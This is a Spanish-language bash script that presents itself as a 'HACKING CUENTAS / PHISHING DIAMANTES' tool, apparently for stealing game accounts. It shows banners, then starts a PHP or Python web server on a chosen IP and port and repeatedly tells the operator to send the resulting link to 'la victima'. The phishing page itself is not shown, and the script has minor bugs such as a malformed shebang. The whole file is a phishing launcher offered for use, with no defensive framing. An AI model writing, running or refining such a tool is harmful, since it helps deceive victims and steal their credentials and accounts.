#!bin/bash

clear



setterm -foreground cyan
echo "     ___________"
echo "    /\/\/\/\/\/\\"
echo "   /             \         HACKING CUENTAS"
echo "  /_______________\ "
echo "  \               /"
echo "   \  Diamantes  /     PHISHING DIAMANTES" 
echo "    \           /"
echo "     \         /"
echo "      \       /"
echo "       \     /"
echo "        \   /"
echo "         \ /"
setterm -foreground red
echo "[V]1.1"


while true; do
setterm -foregroun yellow
echo -e "[1] iniciar el phishing con php 😈"
echo "[2] iniciar el phishing con python3 🤣"
echo "[3] EXIT"
setterm -foreground green
read -p "elije una opcion: " option
case $option in


1) 
clear
setterm -foreground cyan
echo "     ___________"
echo "    /\/\/\/\/\/\\"
echo "   /             \         HACKING CUENTAS"
echo "  /_______________\ "
echo "  \               /"
echo "   \  Diamantes  /     PHISHING DIAMANTES"
echo "    \           /"
echo "     \         /"
echo "      \       /"
echo "       \     /"
echo "        \   /"
echo "         \ /"
setterm -foreground red
echo "[V]1.1"



setterm -foreground blue
ifconfig
echo "ingresa tu ip privada"
echo "_______________________|"
setterm -foreground green
read -p "ip privada: " il
echo "_____________________________|"
setterm -foreground cyan
echo "ingresa el puerto a usar"
setterm -foreground green
read -p "port: " kl
clear
setterm -foreground cyan
echo "     ___________"
echo "    /\/\/\/\/\/\\"
echo "   /             \         HACKING CUENTAS"
echo "  /_______________\ "
echo "  \               /"
echo "   \  Diamantes  /     PHISHING DIAMANTES"
echo "    \           /"
echo "     \         /"
echo "      \       /"
echo "       \     /"
echo "        \   /"
echo "         \ /"
setterm -foreground red
echo "[V]1.1"

setterm -foreground yellow
echo "enbiale este link ala victima"
setterm -foreground red
echo "[link]: http://$il:$kl"
setterm -foreground yellow
php -S $il:$kl
exit
;;

2)setterm -foreground blue
echo "enbiale este link ala victima"
echo "_____________________________|"
setterm -foreground green
echo "link: http://[::]:8070"
echo "_______________________|"
setterm -foreground yellow
python3 -m http.server 8070 
exit
;;

3)clear
setterm -foreground cyan
echo "ESTA ERAMIENTA FUE CREADA POR"
echo "ANONYMATOS"
break
exit
;;

esac


done
